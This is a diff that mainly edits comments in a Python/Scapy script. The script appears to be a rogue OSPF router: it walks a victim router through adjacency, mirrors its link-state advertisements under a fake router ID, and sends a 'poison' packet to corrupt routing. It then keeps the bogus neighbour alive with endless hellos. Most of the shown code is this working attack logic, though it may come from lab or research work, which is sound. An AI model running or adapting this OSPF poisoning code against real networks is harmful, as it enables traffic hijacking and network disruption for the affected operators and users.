@@ -82,14 +82,14 @@ def handle_packet(packet):
             state = "HELLO_RESPONDED"
             print("HELLO_RESPONDED")
 
-        # If in "HELLO_RESPONDED" state, handle the DBD packet
+        # If in "HELLO_RESPONDED" state, handle the Initial DBD packet
         elif state == "HELLO_RESPONDED" and ospf_layer.type == 2:
             print("Received OSPF DBD packet")
             send_dbd_response(packet)
             state = "DBD_SENT"
             print("DBD_SENT")
         
-        # If in "DBD_SENT" state, handle the DBD packet
+        # If in "DBD_SENT" state, handle the 2nd DBD packet
         elif state == "DBD_SENT" and ospf_layer.type == 2:
             print("Received 2nd OSPF DBD packet")
             log_dbd_flags(packet)
@@ -103,7 +103,7 @@ def handle_packet(packet):
             state = "REQ_SENT"
             print("REQ_SENT")
         
-        # If in "REQ_SENT" state and received the LS Update packet
+        # If in "REQ_SENT" state, handle the LS Update packet
         elif state == "REQ_SENT" and ospf_layer.type == 4:
             print("Received OSPF LS Update packet")
             log_lsa_details(packet)
@@ -111,7 +111,7 @@ def handle_packet(packet):
             state = "UPDATE_SENT"
             print("UPDATE_SENT")
         
-        # If in "UPDATE_SENT" state, send the LS Update packet
+        # If in "UPDATE_SENT" state, handle the LS Update packet
         elif state == "UPDATE_SENT" and ospf_layer.type == 4:
             print("Received OSPF LS Update packet")
             send_ls_r_upd_update(packet)
@@ -129,12 +129,14 @@ def handle_packet(packet):
             state = "ACK_SENT"
             print("ACK_SENT")
             
+        # If in "FULL" state and is poison time, handle the Hello Packet
         elif state == "FULL" and ospf_layer.type == 1 and poison_time == 1:
             send_ls_ack_target()
             send_poison_packet(packet)
             state = "POISON_SENT"
             print("POISON_SENT")
         
+        # If in "FULL" state or "POISON_PROP" state, handle the LS Update packet
         elif state == "FULL" or state == "POISON_PROP" and ospf_layer.type == 4:
             print("Received LS Update despite FULL/DR status")    
             
@@ -146,6 +148,7 @@ def handle_packet(packet):
                 last_lsupd_time = current_time
                 print("Periodic LS Update response sent")
         
+        # If in "FULL" state or "POISON_PROP" state, handle the LS Ack packet
         elif state == "FULL" or state == "POISON_PROP" and ospf_layer.type == 5:
             print("Received LS Ack despite FULL/DR status") 
             send_ls_ack_target_2()
@@ -162,6 +165,7 @@ def handle_packet(packet):
         # elif state == "FULL" or state == "POISON_PROP" and ospf_layer.type == 1:
             # send_hello_neighbor()
         
+        # If in "POISON_PROP" state, send hello packets forever to keepalive the OSPF neighbour state
         elif state == "POISON_SENT" and ospf_layer.type == 4 or ospf_layer.type == 5 and poison_time == 1:
             state = "POISON_PROP"
             print("POISON_PROP")
@@ -227,12 +231,13 @@ def send_hello_neighbor():
     )
     
     # Manual LLS Data Block
-    # lls_data = struct.pack('!HHI', 1, 4, 0x00000001)  # TLV Type 1, Length 4, Option LSDB Resync
+    # lls_data = struct.pack('!HHI', 1, 4, 0x00000001)  # attempting TLV Type 1, Length 4, Option LSDB Resync
     # lls_checksum = checksum(lls_data)
     # lls_data_block = struct.pack('!HH', lls_checksum, len(lls_data) + 4) + lls_data
     
+    # This works instead as an LLS Data Block
     lls_extended_opts = LLS_Extended_Options(
-        options=b'\x00\x00\x00\x01'  # The LSDB Resynchronization flag
+        options=b'\x00\x00\x00\x01'  # The LSDB Resync flag
     )
     
     ospf_lls = OSPF_LLS_Hdr(llstlv=[lls_extended_opts])
@@ -249,6 +254,7 @@ def send_hello_neighbor():
     ) / ospf_header_hello / ospf_hello / ospf_lls
     send(ospf_packet_hello, iface="eth0", verbose=1)
 
+# Function to send Initial DBD response to Initial DBD packet
 def send_dbd_response(received_packet):
     lsaheaders = []
     for lsa in received_packet[OSPF_DBDesc].lsaheaders:
@@ -279,6 +285,7 @@ def send_dbd_response(received_packet):
     ) / ospf_header_dbd / ospf_dbd
     send(ospf_packet_dbd, iface="eth0", verbose=1)
 
+# Function to send 2nd and last DBD response to 2nd DBD packet
 def send_dbd_response_2(received_packet):
     
     ddseq = received_packet[OSPF_DBDesc].ddseq + 1 # sequence number
@@ -299,7 +306,7 @@ def send_dbd_response_2(received_packet):
     # lls_data_block = struct.pack('!HH', lls_checksum, len(lls_data) + 4) + lls_data
     
     lls_extended_opts = LLS_Extended_Options(
-        options=b'\x00\x00\x00\x01'  # Setting the LSDB Resynchronization flag
+        options=b'\x00\x00\x00\x01'  # The LSDB Resync flag
     )
     
     ospf_lls = OSPF_LLS_Hdr(llstlv=[lls_extended_opts])
@@ -325,8 +332,8 @@ def send_dbd_response_2(received_packet):
     
     send(ospf_packet_dbd, iface="eth0", verbose=1)
 
+# Function to send LS Request Type 3 after sending 2nd and last DBD packet
 def send_ls_request(received_packet):
-    # Define OSPF LS Request Packet
     ospf_request = OSPF_LSReq(
         requests=[OSPF_LSReq_Item(type=1, id="1.1.1.1", adrouter="1.1.1.1")]
     )
@@ -342,7 +349,7 @@ def send_ls_request(received_packet):
     ) / ospf_header_request / ospf_request
     send(ospf_packet_request, iface="eth0", verbose=1)
 
-
+# Function to send LS Update Type 4 after receiving LS Update packet
 def send_ls_r_update(received_packet):
     ospf_update = OSPF_LSUpd(
         lsacount=1, # Number of LSAs in this update
@@ -369,6 +376,7 @@ def send_ls_r_update(received_packet):
     
     send(ospf_packet_update, iface="eth0", verbose=1)
 
+# Function to send LS Update Type 4 after receiving LS Update packet
 def send_ls_r_upd_update(received_packet):
     
     lsa = received_packet[OSPF_Router_LSA]
@@ -376,7 +384,7 @@ def send_ls_r_upd_update(received_packet):
     lsa_age = lsa.age
     
     linklist = []
-    for link in lsa.linklist:
+    for link in lsa.linklist: # capture all info in linklist to mirror back
         parsed_link = OSPF_Link(
             type=link.type,
             id=link.id,
@@ -393,7 +401,7 @@ def send_ls_r_upd_update(received_packet):
         adrouter="3.3.3.3", 
         seq=lsa_seq, 
         options=0x22, # 0x22 is Demand Circuits, External Routing
-        linklist=linklist)] # List of Networks available and their IDs
+        linklist=linklist)] # List of captured Networks available and their IDs
     )
     ospf_header_update = OSPF_Hdr(
         version=2,
@@ -408,6 +416,7 @@ def send_ls_r_upd_update(received_packet):
     
     send(ospf_packet_update, iface="eth0", verbose=1)
 
+# Function to send LS Update Type 4 after receiving LS Update packet
 def send_ls_r_upd_upd_update(received_packet):
     
     global lsa_seq_r
@@ -418,7 +427,7 @@ def send_ls_r_upd_upd_update(received_packet):
     lsa_seq_r = lsa_seq
     
     linklist = []
-    for link in lsa.linklist:
+    for link in lsa.linklist: # capture all info in linklist to mirror back
         parsed_link = OSPF_Link(
             type=link.type,
             id=link.id,
@@ -435,7 +444,7 @@ def send_ls_r_upd_upd_update(received_packet):
         adrouter="3.3.3.3", 
         seq=lsa_seq, 
         options=0x22, # 0x22 is Demand Circuits, External Routing
-        linklist=linklist)] # List of Networks available and their IDs
+        linklist=linklist)] # List of captured Networks available and their IDs
     )
     ospf_header_update = OSPF_Hdr(
         version=2,
@@ -455,10 +464,10 @@ def send_ls_n_update():
         lsacount=1,  # Number of LSAs in this update
         lsalist=[OSPF_Network_LSA(
             id="192.168.10.99",  # Network ID, copying pcap
-            adrouter="3.3.3.3",  # Advertising router ID
-            seq=0x80000001,  # Sequence number
+            adrouter="3.3.3.3",  # Advertising router ID, not spelt adbrouter
+            seq=0x80000001,  
             options=0x22,  # 0x22 represents External Routing capability
-            mask="255.255.255.0",  # Subnet mask of the network
+            mask="255.255.255.0",  
             routerlist=["1.1.1.1", "3.3.3.3"]  # List of Router IDs in this network
         )]
     )
@@ -489,7 +498,7 @@ def send_ls_ack_target():
             options=0x22,
             id="192.168.10.1",  # Network ID, copying pcap
             adrouter="1.1.1.1",  # Their router ID
-            seq=0x80000005  # Sequence number (increment if re-sending)
+            seq=0x80000005  
             )
         ]
     )
@@ -520,7 +529,7 @@ def send_ls_ack_target_2():
             options=0x22,
             id="1.1.1.1",  # Network ID, copying pcap
             adrouter="1.1.1.1",  # Their router ID
-            seq=lsa_seq  # Sequence number (increment if re-sending)
+            seq=lsa_seq  
             )
         ]
     )
@@ -552,7 +561,7 @@ def send_ls_ack_all():
             options=0x22,
             id="1.1.1.1",  # Network ID, copying pcap
             adrouter="1.1.1.1",  # Their router ID
-            seq=lsa_seq_r  # Sequence number (increment if re-sending)
+            seq=lsa_seq_r  
             )
         ]
     )
@@ -629,6 +638,7 @@ def send_periodic_hellos():
     print("Sent 5 Hello packets.")
 
 def send_periodic_hellos_4ever():
+    # Once poison is propagated, send periodic Hello packets forever
     print("Resuming periodic Hello packets...")
     
     while True:
